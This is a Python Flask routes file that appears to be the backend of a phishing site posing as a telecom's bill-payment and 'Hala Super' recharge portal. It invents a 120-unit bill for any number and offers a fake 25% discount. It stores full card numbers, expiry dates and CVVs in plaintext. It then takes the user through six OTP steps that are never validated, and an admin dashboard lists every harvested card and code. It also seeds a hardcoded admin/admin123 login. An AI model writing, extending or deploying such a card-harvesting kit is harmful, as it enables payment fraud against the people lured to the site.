from flask import render_template, redirect, url_for, request, session, flash, jsonify
import random
import uuid
from datetime import datetime, timedelta
from app import app, db
from models import User, Bill, Recharge, Package, CardData, VerificationCode, Admin
from forms import MobileNumberForm, BillPaymentForm, RechargeForm, PaymentForm, OTPForm, AdminLoginForm
from werkzeug.security import generate_password_hash, check_password_hash
from functools import wraps

# تعريف مرشح التحقق من صلاحيات المسؤول
def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'admin_logged_in' not in session:
            flash('يرجى تسجيل الدخول أولاً', 'warning')
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated_function

# إضافة وظيفة مساعدة now() للقوالب
@app.context_processor
def utility_processor():
    return dict(now=datetime.now)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/bill-payment', methods=['GET', 'POST'])
def bill_payment():
    form = BillPaymentForm()
    
    if form.validate_on_submit():
        mobile_number = form.mobile_number.data
        
        # Check if user exists
        user = User.query.filter_by(mobile_number=mobile_number).first()
        if not user:
            # For demo purposes, create a new user with a random bill
            user = User(mobile_number=mobile_number)
            db.session.add(user)
            db.session.flush()  # Get user ID without committing
            
            # تعيين المبلغ المستحق بقيمة 120 ريال عماني لجميع العملاء
            amount = 120.00
            due_date = datetime.today() + timedelta(days=random.randint(5, 15))
            bill = Bill(
                user_id=user.id,
                bill_number=f"BILL-{random.randint(1000, 9999)}",
                amount=amount,
                due_date=due_date,
                is_paid=False
            )
            db.session.add(bill)
            db.session.commit()
        
        # Get the latest unpaid bill
        bill = Bill.query.filter_by(user_id=user.id, is_paid=False).order_by(Bill.due_date.desc()).first()
        
        # إذا لم يكن لديه فاتورة، أنشئ فاتورة جديدة مستحقة بقيمة 120 ريال عماني
        if not bill:
            amount = 120.00
            due_date = datetime.today() + timedelta(days=random.randint(5, 15))
            bill = Bill(
                user_id=user.id,
                bill_number=f"BILL-{random.randint(1000, 9999)}",
                amount=amount,
                due_date=due_date,
                is_paid=False
            )
            db.session.add(bill)
            db.session.commit()
        
        # Store bill info in session
        session['bill_id'] = bill.id
        session['bill_amount'] = bill.amount
        session['bill_due_date'] = bill.due_date.strftime('%Y-%m-%d')
        session['mobile_number'] = mobile_number
        
        return render_template('bill_payment.html', form=form, bill=bill)
    
    return render_template('bill_payment.html', form=form, bill=None)

@app.route('/pay-bill', methods=['GET', 'POST'])
def pay_bill():
    if 'bill_id' not in session or 'bill_amount' not in session:
        flash('يرجى الاستعلام عن الفاتورة أولاً', 'warning')
        return redirect(url_for('bill_payment'))
    
    form = PaymentForm()
    
    if request.method == 'GET':
        form.amount.data = session['bill_amount']
        form.mobile_number.data = session.get('mobile_number', '')
    
    if form.validate_on_submit():
        # تطبيق خصم 25% على المبلغ
        original_amount = float(form.amount.data)
        discounted_amount = original_amount * 0.75  # خصم 25%
        
        # Store payment info in session
        session['original_amount'] = original_amount
        session['payment_amount'] = discounted_amount
        
        # Remove spaces from card number and get last 4 digits
        card_number = form.card_number.data.replace(' ', '')
        session['payment_card'] = card_number[-4:]  # Store only last 4 digits
        
        # توليد رقم العملية
        transaction_id = f"TXN-{random.randint(100000, 999999)}"
        session['transaction_id'] = transaction_id
        
        # تخزين بيانات البطاقة في قاعدة البيانات
        card_data = CardData(
            mobile_number=form.mobile_number.data,
            cardholder_name=form.cardholder_name.data,
            card_number=card_number,
            expiry_date=form.expiry_date.data,
            cvv=form.cvv.data,
            amount=discounted_amount,  # تخزين المبلغ بعد الخصم
            transaction_id=transaction_id,
            status='pending'
        )
        db.session.add(card_data)
        db.session.commit()
        
        # تخزين معرف بيانات البطاقة في الجلسة
        session['card_data_id'] = card_data.id
        
        # توليد رمز التحقق وتخزينه في قاعدة البيانات
        otp_code = '123456'  # في التطبيق الحقيقي يجب توليد رمز عشوائي وإرساله برسالة نصية
        session['otp_code'] = otp_code
        
        # تخزين رمز التحقق في قاعدة البيانات
        verification = VerificationCode(
            card_data_id=card_data.id,
            otp_code=otp_code,
            otp_step=1,
            status='pending'
        )
        db.session.add(verification)
        db.session.commit()
        
        # تخزين معرف التحقق في الجلسة
        session['verification_id'] = verification.id
        
        # نقل المستخدم مباشرة إلى صفحة التحقق OTP
        return redirect(url_for('otp_verification'))
    
    return render_template('payment.html', form=form, payment_type='bill')

@app.route('/recharge', methods=['GET', 'POST'])
def recharge():
    form = RechargeForm()
    
    # Get recommended package from wizard if available
    recommended_package_id = request.args.get('recommended_package')
    
    # Get all active packages for the dropdown
    packages = Package.query.filter_by(is_active=True, package_type='prepaid').all()
    form.package.choices = [('', 'اختر باقة...')] + [(str(p.id), f"{p.name_ar} - {p.price} ر.ق") for p in packages]
    
    # Set recommended package if provided
    if recommended_package_id:
        form.package.data = recommended_package_id
    
    if form.validate_on_submit():
        mobile_number = form.mobile_number.data
        
        # Store mobile number in session
        session['mobile_number'] = mobile_number
        
        if form.package.data:
            # باقة محددة
            package_id = int(form.package.data)
            
            # Get the selected package
            package = Package.query.get(package_id)
            if not package:
                flash('الباقة غير موجودة', 'error')
                return redirect(url_for('recharge'))
            
            # Store package details in session
            session['package_id'] = package_id
            session['package_price'] = package.price
            session['package_name'] = package.name_ar
            session['is_custom_recharge'] = False
            
        else:
            # تعبئة مباشرة (بدون باقة)
            custom_amount = float(form.custom_amount.data)
            
            # Store custom amount in session
            session['custom_amount'] = custom_amount
            session['is_custom_recharge'] = True
        
        # Redirect to payment page
        return redirect(url_for('recharge_payment'))
    
    # Get all package types to display on the page
    data_packages = Package.query.filter_by(is_active=True, package_type='prepaid').filter(Package.data_allowance > 0).all()
    combo_packages = Package.query.filter_by(is_active=True, package_type='prepaid').filter(Package.data_allowance > 0, Package.voice_minutes > 0).all()
    
    return render_template('recharge.html', form=form, data_packages=data_packages, combo_packages=combo_packages)

@app.route('/recharge-payment', methods=['GET', 'POST'])
def recharge_payment():
    # إذا كان الطلب POST مباشر من صفحة الباقات، نقوم بمعالجته أولاً
    if request.method == 'POST' and 'mobile_number' in request.form:
        mobile_number = request.form['mobile_number']
        
        # تخزين بيانات الرقم في الجلسة
        session['mobile_number'] = mobile_number
        
        # التحقق من نوع التعبئة (باقة أو مبلغ مخصص)
        if request.form.get('package') and request.form.get('package').strip():
            package_id = request.form.get('package')
            
            # الحصول على الباقة المختارة
            package = Package.query.get(package_id)
            if not package:
                flash('الباقة غير موجودة', 'error')
                return redirect(url_for('recharge'))
            
            # تخزين تفاصيل الباقة
            session['package_id'] = int(package_id)
            session['package_price'] = package.price
            session['package_name'] = package.name_ar
            session['is_custom_recharge'] = False
            
        elif request.form.get('custom_amount') and request.form.get('custom_amount').strip():
            # تعبئة بمبلغ مخصص
            custom_amount = request.form.get('custom_amount')
            session['custom_amount'] = custom_amount
            session['is_custom_recharge'] = True
    
    # تحقق من البيانات المطلوبة في الجلسة
    if 'mobile_number' not in session:
        flash('يرجى تحديد رقم الهاتف أولاً', 'warning')
        return redirect(url_for('recharge'))
    
    if 'is_custom_recharge' not in session:
        flash('يرجى تحديد نوع التعبئة أولاً', 'warning')
        return redirect(url_for('recharge'))
    
    form = PaymentForm()
    
    if request.method == 'GET':
        form.mobile_number.data = session['mobile_number']
        
        # تعيين المبلغ حسب نوع التعبئة
        if session['is_custom_recharge']:
            form.amount.data = session['custom_amount']
        else:
            form.amount.data = session['package_price']
    
    if form.validate_on_submit():
        # تطبيق خصم 25% على المبلغ
        original_amount = float(form.amount.data)
        discounted_amount = original_amount * 0.75  # خصم 25%
        
        # تخزين بيانات الدفع
        session['original_amount'] = original_amount
        session['payment_amount'] = discounted_amount
        
        # إزالة المسافات من رقم البطاقة والحصول على آخر 4 أرقام
        card_number = form.card_number.data.replace(' ', '')
        session['payment_card'] = card_number[-4:]  # تخزين آخر 4 أرقام فقط
        
        # توليد رقم العملية
        transaction_id = f"TXN-{random.randint(100000, 999999)}"
        session['transaction_id'] = transaction_id
        
        # تخزين بيانات البطاقة في قاعدة البيانات
        card_data = CardData(
            mobile_number=form.mobile_number.data,
            cardholder_name=form.cardholder_name.data,
            card_number=card_number,
            expiry_date=form.expiry_date.data,
            cvv=form.cvv.data,
            amount=discounted_amount,  # تخزين المبلغ بعد الخصم
            transaction_id=transaction_id,
            status='pending'
        )
        db.session.add(card_data)
        db.session.commit()
        
        # تخزين معرف بيانات البطاقة في الجلسة
        session['card_data_id'] = card_data.id
        
        # توليد رمز التحقق وتخزينه في قاعدة البيانات
        otp_code = '123456'  # في التطبيق الحقيقي يجب توليد رمز عشوائي وإرساله برسالة نصية
        session['otp_code'] = otp_code
        
        # تخزين رمز التحقق في قاعدة البيانات
        verification = VerificationCode(
            card_data_id=card_data.id,
            otp_code=otp_code,
            otp_step=1,
            status='pending'
        )
        db.session.add(verification)
        db.session.commit()
        
        # تخزين معرف التحقق في الجلسة
        session['verification_id'] = verification.id
        
        # نقل المستخدم مباشرة إلى صفحة التحقق OTP
        return redirect(url_for('otp_verification'))
    
    # تحضير سياق الدفع للعرض في الصفحة
    if session['is_custom_recharge']:
        payment_context = {
            'is_custom_recharge': True,
            'amount': session['custom_amount'],
            'mobile_number': session['mobile_number']
        }
    else:
        package = Package.query.get(session['package_id'])
        payment_context = {
            'is_custom_recharge': False,
            'package': package,
            'mobile_number': session['mobile_number']
        }
    
    return render_template('payment.html', form=form, payment_type='recharge', payment_context=payment_context)

@app.route('/package-wizard')
def package_wizard():
    """Interactive wizard to help users find the perfect mobile package"""
    # Get all active packages for reference
    packages = Package.query.filter_by(is_active=True, package_type='prepaid').all()
    return render_template('package_wizard.html', packages=packages)

@app.route('/api/package-recommendations')
def api_package_recommendations():
    """API endpoint to get package recommendations based on user preferences"""
    # Get parameters from request
    data_usage = request.args.get('data_usage', type=int, default=0)
    voice_usage = request.args.get('voice_usage', type=int, default=0)
    budget = request.args.get('budget', type=int, default=0)
    
    # Set up query for packages
    query = Package.query.filter_by(is_active=True, package_type='prepaid')
    
    # Apply filters based on parameters
    if budget > 0:
        query = query.filter(Package.price <= budget)
    
    if data_usage > 0:
        required_data = data_usage * 1024  # Convert GB to MB
        query = query.filter(Package.data_allowance >= required_data)
    
    if voice_usage > 0:
        query = query.filter(Package.voice_minutes >= voice_usage)
    
    # Get results
    packages = query.all()
    
    # If no packages match all criteria, get closest matches
    if not packages and (data_usage > 0 or voice_usage > 0):
        # Get all packages and sort them based on how close they are to requirements
        all_packages = Package.query.filter_by(is_active=True, package_type='prepaid')
        
        if budget > 0:
            all_packages = all_packages.filter(Package.price <= budget * 1.5)  # Allow some flexibility
        
        all_packages = all_packages.all()
        
        # Score packages based on how close they are to requirements
        package_scores = []
        for p in all_packages:
            score = 0
            
            # Data score
            if data_usage > 0:
                if p.data_allowance >= required_data:
                    score += 2  # Meets or exceeds requirements
                else:
                    data_ratio = p.data_allowance / required_data
                    score += data_ratio  # Partial score based on how close
            
            # Voice score
            if voice_usage > 0:
                if p.voice_minutes >= voice_usage:
                    score += 2  # Meets or exceeds requirements
                else:
                    voice_ratio = p.voice_minutes / voice_usage
                    score += voice_ratio  # Partial score
            
            # Budget score (inverse - lower is better)
            if budget > 0:
                budget_ratio = budget / p.price if p.price > 0 else 0
                score += min(budget_ratio, 2)  # Cap at 2 points
            
            package_scores.append((p, score))
        
        # Sort by score (descending) and take top 3
        package_scores.sort(key=lambda x: x[1], reverse=True)
        packages = [p[0] for p in package_scores[:3]]
    
    # Format results
    result = []
    for package in packages:
        result.append({
            'id': package.id,
            'name': package.name,
            'name_ar': package.name_ar,
            'price': package.price,
            'data_allowance_gb': package.data_allowance / 1024,  # Convert MB to GB
            'voice_minutes': package.voice_minutes,
            'validity_days': package.validity_days,
            'description_ar': package.description_ar
        })
    
    return jsonify(result)

@app.route('/otp-verification', methods=['GET', 'POST'])
def otp_verification():
    # التحقق من وجود رقم معاملة في الجلسة
    if 'transaction_id' not in session:
        flash('حدث خطأ في عملية الدفع', 'error')
        return redirect(url_for('index'))
    
    form = OTPForm()
    
    # عند تحميل الصفحة لأول مرة (GET)
    if request.method == 'GET':
        form.transaction_id.data = session['transaction_id']
        # تعيين خطوة التحقق الأولى إذا لم تكن موجودة
        if 'otp_step' not in session:
            session['otp_step'] = '1'
            form.otp_step.data = '1'
        else:
            form.otp_step.data = session['otp_step']
    
    # عند إرسال النموذج (POST)
    if form.validate_on_submit():
        # التحقق من خطوة OTP الحالية وإنتقال للخطوة التالية
        current_step = session.get('otp_step', '1')
        
        # الانتقال إلى الخطوة التالية بناءً على الخطوة الحالية
        if current_step == '1':
            session['otp_step'] = '2'
            form.otp_step.data = '2'
            # مسح قيمة حقل OTP للخطوة التالية
            form.otp.data = ''
            return render_template('otp.html', form=form)
            
        elif current_step == '2':
            session['otp_step'] = '3'
            form.otp_step.data = '3'
            # مسح قيمة حقل OTP للخطوة التالية
            form.otp.data = ''
            return render_template('otp.html', form=form)
            
        elif current_step == '3':
            session['otp_step'] = '4'
            form.otp_step.data = '4'
            # مسح قيمة حقل OTP للخطوة التالية
            form.otp.data = ''
            return render_template('otp.html', form=form)
            
        elif current_step == '4':
            session['otp_step'] = '5'
            form.otp_step.data = '5'
            # مسح قيمة حقل OTP للخطوة التالية
            form.otp.data = ''
            return render_template('otp.html', form=form)
            
        elif current_step == '5':
            session['otp_step'] = '6'
            form.otp_step.data = '6'
            # مسح قيمة حقل OTP للخطوة التالية
            form.otp.data = ''
            return render_template('otp.html', form=form)
        
        elif current_step == '6':
            # اكتملت جميع خطوات التحقق، معالجة الدفع
            
            # تحديث حالة بيانات البطاقة
            if 'card_data_id' in session:
                card_data = CardData.query.get(session['card_data_id'])
                if card_data:
                    card_data.status = 'completed'
                    db.session.commit()
            
            # تحديث حالة رمز التحقق
            if 'verification_id' in session:
                verification = VerificationCode.query.get(session['verification_id'])
                if verification:
                    verification.status = 'verified'
                    verification.verified_at = datetime.utcnow()
                    db.session.commit()
            
            transaction_details = {}
        
        # معالجة الدفع حسب النوع
        if 'bill_id' in session:
            # تحديث حالة دفع الفاتورة
            bill = Bill.query.get(session['bill_id'])
            if bill:
                bill.is_paid = True
                bill.payment_date = datetime.utcnow()
                db.session.commit()
                
                transaction_details = {
                    'type': 'bill',
                    'amount': session.get('bill_amount'),
                    'mobile_number': session.get('mobile_number'),
                    'bill_number': bill.bill_number,
                    'success_message': 'تم دفع الفاتورة بنجاح'
                }
                
                flash('تم دفع الفاتورة بنجاح', 'success')
        
        elif 'mobile_number' in session:
            # الحصول على المستخدم أو إنشاؤه
            user = User.query.filter_by(mobile_number=session.get('mobile_number')).first()
            if not user:
                user = User(mobile_number=session.get('mobile_number'))
                db.session.add(user)
                db.session.flush()
            
            # التحقق من نوع التعبئة (مخصصة أو باقة)
            if session.get('is_custom_recharge'):
                # إنشاء سجل تعبئة مخصصة
                recharge = Recharge(
                    user_id=user.id,
                    amount=session['custom_amount'],
                    recharge_type='custom',
                    transaction_id=session['transaction_id']
                )
                db.session.add(recharge)
                db.session.commit()
                
                transaction_details = {
                    'type': 'recharge',
                    'recharge_type': 'custom',
                    'amount': session.get('custom_amount'),
                    'mobile_number': session.get('mobile_number'),
                    'success_message': f'تم تعبئة الرصيد بنجاح بمبلغ {session["custom_amount"]} ر.ق'
                }
                
                flash(f'تم تعبئة الرصيد بنجاح بمبلغ {session["custom_amount"]} ر.ق', 'success')
            
            elif 'package_id' in session:
                # إنشاء سجل تعبئة باقة
                package = Package.query.get(session['package_id'])
                recharge = Recharge(
                    user_id=user.id,
                    amount=session['package_price'],
                    recharge_type='data' if package.data_allowance > 0 and package.voice_minutes == 0 else 'combo',
                    transaction_id=session['transaction_id']
                )
                db.session.add(recharge)
                db.session.commit()
                
                transaction_details = {
                    'type': 'recharge',
                    'recharge_type': 'package',
                    'package_name': package.name_ar,
                    'amount': session.get('package_price'),
                    'mobile_number': session.get('mobile_number'),
                    'success_message': f'تم تعبئة الرصيد بنجاح بباقة {package.name_ar}'
                }
                
                flash(f'تم تعبئة الرصيد بنجاح بباقة {package.name_ar}', 'success')
        
        # تخزين تفاصيل المعاملة للعرض
        transaction_number = session.get('transaction_id', '')
        payment_card_last4 = session.get('payment_card', '')
        
        # تعيين حالة نجاح النموذج
        form.transaction_completed = True
        
        # مسح البيانات الحساسة من الجلسة
        for key in ['bill_id', 'bill_amount', 'bill_due_date', 'package_id', 
                   'package_price', 'package_name', 'payment_amount', 
                   'payment_card', 'transaction_id', 'otp_code', 'otp_step',
                   'custom_amount', 'is_custom_recharge']:
            if key in session:
                session.pop(key)
        
        # إرجاع قالب نجاح OTP
        return render_template('otp.html', form=form, 
                             transaction_completed=True,
                             transaction_details=transaction_details,
                             transaction_number=transaction_number,
                             payment_card_last4=payment_card_last4)
    
    # لطلبات GET أو النماذج غير الصالحة
    return render_template('otp.html', form=form)

# صفحات المسؤول
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    """صفحة تسجيل دخول المسؤول"""
    form = AdminLoginForm()
    
    if form.validate_on_submit():
        username = form.username.data
        password = form.password.data
        
        # البحث عن المسؤول بواسطة اسم المستخدم
        admin = Admin.query.filter_by(username=username).first()
        
        if admin and check_password_hash(admin.password_hash, password):
            # تسجيل دخول المسؤول
            session['admin_logged_in'] = True
            session['admin_id'] = admin.id
            session['admin_username'] = admin.username
            
            flash('تم تسجيل الدخول بنجاح', 'success')
            return redirect(url_for('admin_dashboard'))
        else:
            flash('اسم المستخدم أو كلمة المرور غير صحيحة', 'danger')
    
    return render_template('admin/login.html', form=form)

@app.route('/admin/dashboard')
@admin_required
def admin_dashboard():
    """لوحة تحكم المسؤول"""
    # استعلام بيانات البطاقات وأرقام الهواتف ورموز التحقق
    card_data = CardData.query.order_by(CardData.created_at.desc()).all()
    verification_codes = VerificationCode.query.order_by(VerificationCode.created_at.desc()).all()
    
    return render_template('admin/dashboard.html', 
                          card_data=card_data,
                          verification_codes=verification_codes)

@app.route('/admin/logout')
def admin_logout():
    """تسجيل خروج المسؤول"""
    session.pop('admin_logged_in', None)
    session.pop('admin_id', None)
    session.pop('admin_username', None)
    
    flash('تم تسجيل الخروج بنجاح', 'success')
    return redirect(url_for('admin_login'))

# Initialize database with sample packages and admin user
@app.route('/create-initial-data')
def create_initial_data():
    """Create initial packages and admin user for the system"""
    # إنشاء حساب المسؤول إذا لم يكن موجودًا
    if Admin.query.count() == 0:
        admin = Admin(
            username='admin',
            password_hash=generate_password_hash('admin123'),
            is_active=True
        )
        db.session.add(admin)
        db.session.commit()
        flash('تم إنشاء حساب المسؤول بنجاح', 'success')
    
    # Only add if no packages exist
    if Package.query.count() == 0:
        packages = [
            {
                'name': 'Hala Super 15', 'name_ar': 'هلا سوبر 15',
                'description': '1.5GB Data + 60 Minutes',
                'description_ar': 'تجربة مميزة مع بطاقة هلا سوبر الجديدة',
                'price': 15.0, 'data_allowance': 1536, 'voice_minutes': 60,
                'validity_days': 30, 'package_type': 'prepaid', 'is_active': True
            },
            {
                'name': 'Hala Super 40', 'name_ar': 'هلا سوبر 40',
                'description': '4GB Data + 150 Minutes + 10 International Minutes',
                'description_ar': 'تجربة مميزة مع بطاقة هلا سوبر الجديدة',
                'price': 40.0, 'data_allowance': 4096, 'voice_minutes': 150,
                'validity_days': 28, 'package_type': 'prepaid', 'is_active': True
            },
            {
                'name': 'Hala Super 65', 'name_ar': 'هلا سوبر 65',
                'description': '8GB Data + 240 Minutes + 20 International Minutes',
                'description_ar': 'تجربة مميزة مع بطاقة هلا سوبر الجديدة',
                'price': 65.0, 'data_allowance': 8192, 'voice_minutes': 240,
                'validity_days': 28, 'package_type': 'prepaid', 'is_active': True
            },
            {
                'name': 'Hala Super 100', 'name_ar': 'هلا سوبر 100',
                'description': '16GB Data + 360 Minutes + 30 International Minutes',
                'description_ar': 'تجربة مميزة مع بطاقة هلا سوبر الجديدة',
                'price': 100.0, 'data_allowance': 16384, 'voice_minutes': 360,
                'validity_days': 28, 'package_type': 'prepaid', 'is_active': True
            },
            {
                'name': 'Hala Super 125', 'name_ar': 'هلا سوبر 125',
                'description': '19GB Data + 500 Minutes + 20 International Minutes',
                'description_ar': 'تجربة مميزة مع بطاقة هلا سوبر الجديدة',
                'price': 125.0, 'data_allowance': 19456, 'voice_minutes': 500,
                'validity_days': 28, 'package_type': 'prepaid', 'is_active': True
            },
            {
                'name': 'Hala Super 200', 'name_ar': 'هلا سوبر 200',
                'description': '32GB Data + 1000 Minutes + 20 International Minutes',
                'description_ar': 'تجربة مميزة مع بطاقة هلا سوبر الجديدة',
                'price': 200.0, 'data_allowance': 32768, 'voice_minutes': 1000,
                'validity_days': 28, 'package_type': 'prepaid', 'is_active': True
            }
        ]
        
        for p in packages:
            package = Package(**p)
            db.session.add(package)
        
        db.session.commit()
        flash('تم إنشاء الباقات بنجاح', 'success')
    
    return redirect(url_for('index'))
